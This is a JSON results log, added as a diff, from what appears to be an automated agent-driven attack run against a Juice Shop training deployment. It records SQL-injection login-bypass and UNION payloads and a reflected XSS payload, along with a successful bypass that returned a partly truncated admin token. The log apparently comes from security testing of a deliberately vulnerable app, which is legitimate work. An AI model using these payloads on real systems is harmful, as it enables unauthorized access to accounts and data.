@@ -1,0 +1,130 @@
+{
+  "run_id": "r1779563300",
+  "target_url": "https://juice-shop-production-d0c5.up.railway.app",
+  "started_at": "2026-05-23T19:08:20Z",
+  "finished_at": "2026-05-23T19:10:02Z",
+  "duration_s": 102.76928225,
+  "generations_run": 1,
+  "total_pods": 3,
+  "outcome": "BREACH",
+  "best_fitness": 1,
+  "breach": {
+    "pod_id": "r1779563300-g1-p0",
+    "generation": 1,
+    "vector": "sqli_login",
+    "category": "injection",
+    "evidence": "admin token returned via SQL bypass",
+    "raw_findings": [
+      {
+        "method": "POST",
+        "snippet": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"}",
+        "status_code": 200,
+        "url": "https://juice-shop-production-d0c5.up.railway.app/rest/user/login"
+      }
+    ]
+  },
+  "per_generation": [
+    {
+      "generation": 1,
+      "population": 3,
+      "survivors": 1,
+      "best_fitness": 1,
+      "breaches": 1,
+      "per_pod": [
+        {
+          "Genome": {
+            "vector": "sqli_login",
+            "category": "injection",
+            "technique": "tautology",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' OR 1=1--",
+              "password": "x"
+            },
+            "hint": "Try classic auth bypass via SQL tautology in email field."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "none",
+            "pod_id": "pi-agent",
+            "generation": 1,
+            "vector": "sqli_login",
+            "category": "injection",
+            "status": "BREACH",
+            "fitness": 1,
+            "evidence": "admin token returned via SQL bypass",
+            "raw_findings": [
+              {
+                "method": "POST",
+        "snippet": "{\"authentication\":{\"token\":\"<JWT redacted; alg=RS256, type=JWT>...\"}",
+                "status_code": 200,
+                "url": "https://juice-shop-production-d0c5.up.railway.app/rest/user/login"
+              }
+            ],
+            "duration_ms": 1234,
+            "t": 1779568733000
+          },
+          "Fitness": 1,
+          "PodID": "r1779563300-g1-p0"
+        },
+        {
+          "Genome": {
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "technique": "union_select",
+            "target_path": "/rest/user/login",
+            "params": {
+              "email_payload": "' UNION SELECT 1,2,3,4,5--"
+            },
+            "hint": "Try UNION-based info leak."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779563300",
+            "pod_id": "r1779563300-g1-p1",
+            "generation": 1,
+            "vector": "sqli_login_union",
+            "category": "injection",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi timed out after 60s",
+            "raw_findings": [],
+            "duration_ms": 63000,
+            "t": 1779563363052
+          },
+          "Fitness": 0,
+          "PodID": "r1779563300-g1-p1"
+        },
+        {
+          "Genome": {
+            "vector": "xss_search_reflected",
+            "category": "xss",
+            "technique": "reflected",
+            "target_path": "/#/search",
+            "params": {
+              "q": "\u003ciframe src=javascript:alert(1)\u003e"
+            },
+            "hint": "Try reflected XSS via search query parameter."
+          },
+          "Result": {
+            "type": "result",
+            "run_id": "r1779563300",
+            "pod_id": "r1779563300-g1-p2",
+            "generation": 1,
+            "vector": "xss_search_reflected",
+            "category": "xss",
+            "status": "NOOP",
+            "fitness": 0,
+            "evidence": "pi timed out after 60s",
+            "raw_findings": [],
+            "duration_ms": 62000,
+            "t": 1779563362390
+          },
+          "Fitness": 0,
+          "PodID": "r1779563300-g1-p2"
+        }
+      ]
+    }
+  ],
+  "narrative_md_path": "out/summary-r1779563300.md"
+}
